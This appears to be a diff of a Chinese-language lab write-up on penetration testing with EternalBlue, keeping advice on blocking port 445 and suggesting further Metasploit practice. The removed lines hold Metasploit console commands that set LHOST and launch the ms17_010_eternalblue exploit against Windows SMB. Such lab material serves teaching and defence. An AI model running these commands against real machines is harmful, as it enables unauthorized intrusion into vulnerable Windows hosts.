@@ -20,12 +20,3 @@
   * 防禦措施：設定防火牆規則，阻擋來自外部的445連線，並監控異常行為。
   * 進一步學習：嘗試使用Metasploit測試其他漏洞，提升滲透測試技能。
 
-
-
-
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 172.17.0.3
-msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
-
-
-
-
